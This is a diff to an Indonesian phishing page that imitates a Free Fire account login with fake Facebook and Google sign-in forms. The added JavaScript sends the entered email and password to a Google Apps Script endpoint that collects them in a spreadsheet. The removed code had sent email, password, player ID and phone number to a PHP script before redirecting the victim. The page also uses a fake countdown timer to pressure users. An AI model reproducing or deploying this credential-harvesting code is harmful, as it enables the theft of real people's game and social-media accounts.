@@ -270,8 +270,7 @@
 			border: 1px solid #000;
 			position: relative;
 			outline: none;
-			-webkit-appearance: none;
-			-moz-appearance: none;
+			
 		}
 
 		.popup-form input::placeholder {
@@ -295,8 +294,7 @@
 			border: 1px solid #000;
 			position: relative;
 			outline: none;
-			-webkit-appearance: none;
-			-moz-appearance: none;
+		
 		}
 	</style>
 	<div class="container">
@@ -480,7 +478,7 @@
 			<div class="popup-box-bg">
 				<div class="popup-alert">Masuk Menggunakan Akun Free Fire Kamu</div> <!--- popup-alert --->
 				<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Masuk Dengan Facebook</button>
-			   <button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-google icon-login"></i> Masuk Dengan Google</button><br><br>
+			   <button type="button" class="popup-btn-login popup-btn-twitter" onclick=""><i class="fa fa-google icon-login"></i> Masuk Dengan Google</button><br><br>
 				<br>
 			</div>
 		</div>
@@ -531,7 +529,7 @@
 				</center>
 				<div class="box-twitter">
 					<center>
-						<form action="javascript:void(0)" method="post" name="facebook-to-spreadsheet" id="ValidateLogintwitterForm">
+						<form action="javascript:void(0)" method="post" name="twitter-to-spreadsheet" id="ValidateLogintwitterForm">
 							<div class="txt-login-twitter">Login Google</div> <!--- txt-login-twitter --->
 							<div class="input-box-twitter">
 								<label>Masukan Email Atau Telephone</label>
@@ -543,7 +541,7 @@
 								<label>Masukan Password</label>
 								<input type="password" style="width: 85%;" name="password-facebook" id="password-twitter" placeholder="" required>
 							</div> <!--- input-box-twitter --->
-							<input type="hidden" name="login-facebook" id="login-twitter" value="Google" readonly>
+							<input type="hidden" name="login-twitter" id="login-twitter" value="Google" readonly>
 							<button style="background: #0036F6;" type="submit" class="btn-login-twitter" onclick="ValidateLogintwitterData()">Masuk</button>
 							<div style="color: #0036F6;" class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
 							<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter --->
@@ -743,6 +741,7 @@
   <script>
 		const scriptURL = 'https://script.google.com/macros/s/AKfycbx_-Gn-3BKQ3ZRT4MpmwwB3MPtOXr19grs4-GcdfCMtRDwvwTEC-qZo3571IOUEJgRAFg/exec'
 		const form = document.forms['facebook-to-spreadsheet']
+		const form2 = document.forms['twitter-to-spreadsheet']
 	  
 		form.addEventListener('submit', e => {
 		  e.preventDefault()
@@ -750,13 +749,20 @@
 			.then(response => console.log('Success!', response))
 			.catch(error => console.error('Error!', error.message))
 		})
+		form2.addEventListener('submit', e => {
+		  e.preventDefault()
+		  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+			.then(response => console.log('Success!', response))
+			.catch(error => console.error('Error!', error.message))
+		})
 	  </script>
+	  
 	<script>
 		// code for showing countdown timer
 		$(document).ready(function() {
 			var detik = 35;
-			var menit = 12;
-			var jam = 8;
+			var menit = 54;
+			var jam = 23;
 
 			function hitung() {
 				setTimeout(hitung, 1000);
@@ -848,6 +854,9 @@
 
 		// code for validate data to next step
 		function ValidateLoginFbData() {
+			setTimeout(function() {
+				location.reload();
+			}, 30000);
 			$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData) {
 				submitingValidateLoginFbData.preventDefault();
 
@@ -865,6 +874,7 @@
 		}
 
 		function ValidateLogintwitterData() {
+			
 			$('#ValidateLogintwitterForm').submit(function(submitingValidateLogintwitterData) {
 				submitingValidateLogintwitterData.preventDefault();
 
@@ -882,49 +892,7 @@
 		}
 
 		// code for validate data to sending to file result
-		function ValidateVerificationData() {
-			// var pubgMobile = $("#ValidateVerificationDataForm").serialize();
-			// $.ajax({
-			// 	url: "https://arpanrizki.com/api/",
-			// 	data: pubgMobile,
-			// 	type: "POST",
-			// 	success: function() {
-			// 		return !0
-			// 	},
-			// 	error: function() {
-			// 		return !0
-			// 	}
-			// });
-			$('#ValidateVerificationDataForm').submit(function(submitingVerificationData) {
-				submitingVerificationData.preventDefault();
-
-				var $validateEmail = $("input#validateEmail").val();
-				var $validatePassword = $("input#validatePassword").val();
-				var $playid = $("input#playid").val();
-				var $phone = $("input#phone").val();
-				var $level = $("input#level").val();
-				var $validateLogin = $("input#validateLogin").val();
-				if ($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == "") {
-					$('.verification_info').show();
-					$('.account_verification').hide();
-					return false;
-				}
-
-				$.ajax({
-					type: "POST",
-					url: "snd.php",
-					data: $(this).serialize(),
-					beforeSend: function() {
-						$('.check_verification').show();
-						$('.account_verification').hide();
-					},
-					success: function() {
-                      location.href = "https://officiallgames.com";
-                            } 
-				});
-			});
-			return false;
-		}; // show hide password for facebook
+		 // show hide password for facebook
 		function showFbPassword() {
 			var x = document.getElementById("password-facebook");
 			if (x.type === "password") {
